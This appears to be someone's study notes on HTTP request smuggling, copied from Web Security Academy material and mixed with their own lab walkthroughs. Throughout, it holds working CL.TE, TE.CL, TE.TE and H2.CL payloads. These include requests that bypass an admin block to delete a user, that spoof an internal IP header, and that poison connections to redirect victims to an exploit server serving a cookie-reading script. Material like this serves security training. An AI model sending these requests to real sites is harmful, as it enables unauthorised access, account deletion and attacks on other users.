Finding HTTP request smuggling vulnerabilities

In this section, we'll explain different techniques for finding HTTP request smuggling vulnerabilities.
Finding HTTP request smuggling vulnerabilities using timing techniques

The most generally effective way to detect HTTP request smuggling vulnerabilities is to send requests that will cause a time delay in the application's responses if a vulnerability is present. This technique is used by Burp Scanner to automate the detection of request smuggling vulnerabilities.
Finding CL.TE vulnerabilities using timing techniques

If an application is vulnerable to the CL.TE variant of request smuggling, then sending a request like the following will often cause a time delay:
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X

Since the front-end server uses the Content-Length header, it will forward only part of this request, omitting the X. The back-end server uses the Transfer-Encoding header, processes the first chunk, and then waits for the next chunk to arrive. This will cause an observable time delay.
Finding TE.CL vulnerabilities using timing techniques

If an application is vulnerable to the TE.CL variant of request smuggling, then sending a request like the following will often cause a time delay:
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X

Since the front-end server uses the Transfer-Encoding header, it will forward only part of this request, omitting the X. 
The back-end server uses the Content-Length header, expects more content in the message body, and waits for the remaining content to arrive. This will cause an observable time delay.
Note

The timing-based test for TE.CL vulnerabilities will potentially disrupt other application users if the application is vulnerable to the CL.TE variant of the vulnerability. 
So to be stealthy and minimize disruption, you should use the CL.TE test first and continue to the TE.CL test only if the first test is unsuccessful.
Confirming HTTP request smuggling vulnerabilities using differential responses

When a probable request smuggling vulnerability has been detected, you can obtain further evidence for the vulnerability by exploiting it to trigger differences in the contents of the application's responses. 
This involves sending two requests to the application in quick succession:

    An "attack" request that is designed to interfere with the processing of the next request.
    A "normal" request.

If the response to the normal request contains the expected interference, then the vulnerability is confirmed.

For example, suppose the normal request looks like this:
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling

This request normally receives an HTTP response with status code 200, containing some search results.

The attack request that is needed to interfere with this request depends on the variant of request smuggling that is present: CL.TE vs TE.CL.
Confirming CL.TE vulnerabilities using differential responses

To confirm a CL.TE vulnerability, you would send an attack request like this:
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x

If the attack is successful, then the last two lines of this request are treated by the back-end server as belonging to the next request that is received. This will cause the subsequent "normal" request to look like this:
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling

Since this request now contains an invalid URL, the server will respond with status code 404, indicating that the attack request did indeed interfere with it.
LAB
PRACTITIONER
HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
Solved
Confirming TE.CL vulnerabilities using differential responses

To confirm a TE.CL vulnerability, you would send an attack request like this:
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
Note

To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.

You need to include the trailing sequence \r\n\r\n following the final 0.

If the attack is successful, then everything from GET /404 onwards is treated by the back-end server as belonging to the next request that is received. This will cause the subsequent "normal" request to look like this:
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 146

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling

Since this request now contains an invalid URL, the server will respond with status code 404, indicating that the attack request did indeed interfere with it.
LAB
PRACTITIONER
HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
Solved
Note

Some important considerations should be kept in mind when attempting to confirm request smuggling vulnerabilities via interference with other requests:

    The "attack" request and the "normal" request should be sent to the server using different network connections. Sending both requests through the same connection won't prove that the vulnerability exists.
    The "attack" request and the "normal" request should use the same URL and parameter names, as far as possible. This is because many modern applications route front-end requests to different back-end servers based on the URL and parameters.
    Using the same URL and parameters increases the chance that the requests will be processed by the same back-end server, which is essential for the attack to work.
    When testing the "normal" request to detect any interference from the "attack" request, you are in a race with any other requests that the application is receiving at the same time, including those from other users.
    You should send the "normal" request immediately after the "attack" request. If the application is busy, you might need to perform multiple attempts to confirm the vulnerability.
    In some applications, the front-end server functions as a load balancer, and forwards requests to different back-end systems according to some load balancing algorithm. 
    If your "attack" and "normal" requests are forwarded to different back-end systems, then the attack will fail. This is an additional reason why you might need to try several times before a vulnerability can be confirmed.
    If your attack succeeds in interfering with a subsequent request, but this wasn't the "normal" request that you sent to detect the interference, then this means that another application user was affected by your attack.
    If you continue performing the test, this could have a disruptive effect on other users, and you should exercise caution.

Read more












CL.TE

Discovery

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked

1
A
x


POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED






TE.CL

Discovery

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 6
Transfer-Encoding: chunked

0

x




POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0







TE.TE

Discovery

POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Transfer-Encoding: x
Content-Length: 6

0

x




POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Transfer-Encoding: x
Content-Length: 4

12
XPOST / HTTP/1.1

0




POST / HTTP/1.1
Host: 0afd00d3037b1685c07a45d100b50055.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: x
Content-Length: 4

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

x=1
0







EXPLOITING HTTP REEQUEST SMUGGLING

cl.te DIFERENTIAL RESPONSE


POST / HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /Post HTTP/1.1
Foo: x





POST / HTTP/1.1
Host: 0a0000d0035fdffac03c4f8a00280079.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: X


GET /404 HTTP/1.1
X-Ignore: X





POST /home HTTP/1.1
Host: 0a0000d0035fdffac03c4f8a00280079.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: 0a0000d0035fdffac03c4f8a00280079.web-security-academy.net
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com






TE.CL Differential rersponse

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0







POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

6e
GET /post HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0








Exploiting CL.TE

POST / HTTP/1.1
Host: 0a7c000a04858564c15d5d6d008f00d9.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

x=






    Try to visit /admin and observe that the request is blocked.

    Using Burp Repeater, issue the following request twice:
    POST / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 37
    Transfer-Encoding: chunked

    0

    GET /admin HTTP/1.1
    X-Ignore: X
    Observe that the merged request to /admin was rejected due to not using the header Host: localhost.

    Issue the following request twice:
    POST / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 54
    Transfer-Encoding: chunked

    0

    GET /admin HTTP/1.1
    Host: localhost
    X-Ignore: X
    Observe that the request was blocked due to the second request's Host header conflicting with the smuggled Host header in the first request.

    Issue the following request twice so the second request's headers are appended to the smuggled request body instead:
    POST / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 116
    Transfer-Encoding: chunked

    0

    GET /admin HTTP/1.1
    Host: localhost
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 10  change it to 6

    x=
    Observe that you can now access the admin panel.

    Using the previous response as a reference, change the smuggled request URL to delete the user carlos:
    POST / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 139
    Transfer-Encoding: chunked

    0

    GET /admin/delete?username=carlos HTTP/1.1
    Host: localhost
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 10  change it to 6

    x=










Exploiting TE.CL to bypass front end control













    Try to visit /admin and observe that the request is blocked.
    In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.

    Using Burp Repeater, issue the following request twice:
    POST / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-length: 4
    Transfer-Encoding: chunked

    60
    POST /admin HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 15

    x=1
    0
    Note

    You need to include the trailing sequence \r\n\r\n following the final 0.
    Observe that the merged request to /admin was rejected due to not using the header Host: localhost.

    Issue the following request twice:
    POST / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-length: 4
    Transfer-Encoding: chunked

    71
    POST /admin HTTP/1.1
    Host: localhost
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 15

    x=1
    0
    Observe that you can now access the admin panel.

    Using the previous response as a reference, change the smuggled request URL to delete the user carlos:
    POST / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-length: 4
    Transfer-Encoding: chunked

    88
    GET /admin/delete?username=carlos HTTP/1.1
    Host: localhost
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 15

    x=1
    0










Revealing front-end request rewriting










    Browse to /admin and observe that the admin panel can only be loaded from 127.0.0.1.
    Use the site's search function and observe that it reflects the value of the search parameter.

    Use Burp Repeater to issue the following request twice.
    POST / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 124
    Transfer-Encoding: chunked

    0

    POST / HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 200
    Connection: close

    search=test

so what we do is that the request which is modified by our frontend we want to see that request but how wew are going to see that request 

 There is often a simple way to reveal exactly how the front-end server is rewriting requests. To do this, you need to perform the following steps:

    Find a POST request that reflects the value of a request parameter into the application's response.
    Shuffle the parameters so that the reflected parameter appears last in the message body.
    Smuggle this request to the back-end server, followed directly by a normal request whose rewritten form you want to reveal.

The requests will be rewritten by the front-end server to include the additional headers, and then the back-end server will process the smuggled request 
and treat the rewritten second request as being the value of the email parameter. 
It will then reflect this value back in the respon

    The second response should contain "Search results for" followed by the start of a rewritten HTTP request.

    Make a note of the name of the X-*-IP header in the rewritten request, and use it to access the admin panel:
    POST / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 143
    Transfer-Encoding: chunked

    0

    GET /admin HTTP/1.1
    X-abcdef-Ip: 127.0.0.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 10
    Connection: close

    x=1

    Using the previous response as a reference, change the smuggled request URL to delete the user carlos:
    POST / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 166
    Transfer-Encoding: chunked

    0

    GET /admin/delete?username=carlos HTTP/1.1
    X-abcdef-Ip: 127.0.0.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 10
    Connection: close

    x=1








H2.CL 








    From the Repeater menu, enable the Allow HTTP/2 ALPN override option and disable the Update Content-Length option.

    Using Burp Repeater, try smuggling an arbitrary prefix in the body of an HTTP/2 request by including a Content-Length: 0 header as follows. Remember to expand the Inspector's Request Attributes section and change the protocol to HTTP/2 before sending the request.
    POST / HTTP/2
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Length: 0

    SMUGGLED

    Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.

    Using Burp Repeater, notice that if you send a request for GET /resources, you are redirected to https://YOUR-LAB-ID.web-security-academy.net/resources/.

    Create the following request to smuggle the start of a request for /resources, along with an arbitrary Host header:
    POST / HTTP/2
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Length: 0

    GET /resources HTTP/1.1
    Host: foo
    Content-Length: 5

    x=1

    Send the request a few times. Notice that smuggling this prefix past the front-end allows you to redirect the subsequent request on the connection to an arbitrary host.

    Go to the exploit server and change the file path to /resources. In the body, enter the payload alert(document.cookie), then store the exploit.

    In Burp Repeater, edit your malicious request so that the Host header points to your exploit server:
    POST / HTTP/2
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Length: 0

    GET /resources HTTP/1.1
    Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
    Content-Length: 5

    x=1

    Send the request a few times and confirm that you receive a redirect to the exploit server.

    Resend the request and wait for 10 seconds or so.

    Go to the exploit server and check the access log. If you see a GET /resources/ request from the victim, this indicates that your request smuggling attack was successful. Otherwise, check that there are no issues with your attack request and try again.

    Once you have confirmed that you can cause the victim to be redirected to the exploit server, repeat the attack until the lab solves. This may take several attempts because you need to time your attack so that it poisons the connection immediately before the victim's browser attempts to import a JavaScript resource. Otherwise, although their browser will load your malicious JavaScript, it won't execute it.


